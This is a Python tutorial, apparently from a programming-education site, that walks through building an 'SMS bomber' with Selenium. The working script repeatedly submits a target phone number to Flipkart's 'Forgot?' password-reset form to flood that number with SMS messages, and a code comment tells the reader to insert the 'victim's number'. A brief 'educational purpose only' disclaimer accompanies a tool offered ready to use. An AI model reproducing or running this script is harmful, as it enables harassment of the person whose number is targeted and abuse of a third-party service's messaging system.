Python | SMS Bomber using Selenium



Here, we are going to learn a simple SMS bomber trick (for fun and educational
purpose). Selenium is a free tool for automated testing across different
browsers. In this tutorial, we will learn to send automatically number of spam
SMS for given number of frequency and interval.

 **Requirement:**  
You need to install **chromedriver** and set path. Click here to download.

 **  
Below are the steps:  
**

  * First go to flipkart website using this Link.
  * Then click on inspect element by pressing ctrl + shift + i or going in setting of browser and clicking on inspect element manually.
  * Then find the class name of “Enter the number” input field and “Forgot?” link. We will use it later.
  * ![FInd class name of 'Ente the number' input field](https://media.geeksforgeeks.org/wp-content/uploads/20190712140334/Screenshot-7110.png)
  * ![Find class name of 'Forgot?' link](https://media.geeksforgeeks.org/wp-content/uploads/20190712140339/Screenshot-726.png)
  * Now, Run the script by putting appropriate class name for each element.
  * Now it will automatically send spam sms to your friend’s mobile number.

 **Note:** This tutorial is for educational purpose only, please don’t use it
for disturbing anyone or any unethical way.

Below is the implementation:

 __

 __  
 __

 __

 __  
 __  
 __

from selenium import webdriver

import time

 

# create instance of Chrome webdriver

browser = webdriver.Chrome()

 

# set the frequency of sms

frequency = 10

 

# target mobile number, change it to victim's number and

# also ensure that it's registered on flipkart

mobile_number ="1234567890"

 

for i in range(frequency):

 browser.get('https://www.flipkart.com/account/login?ret =/')

 

 # find the element where we have to 

 # enter the number using the class name

 number = browser.find_element_by_class_name('_2zrpKA')

 

 # automatically type the target number

 number.send_keys("1234567890")

 

 # find the element to send a forgot password

 # request using it's class name

 forgot = browser.find_element_by_link_text('Forgot?')

 

 # clicking on that element

 forgot.click()

 

 # set the interval to send each sms

 time.sleep(10)

 

# Close the browser

browser.quit()  
  
---  
  
 __

 __

Attention geek! Strengthen your foundations with the **Python Programming
Foundation** Course and learn the basics.

To begin with, your interview preparations Enhance your Data Structures
concepts with the **Python DS** Course.

  
  

  

My Personal Notes _arrow_drop_up_

Save

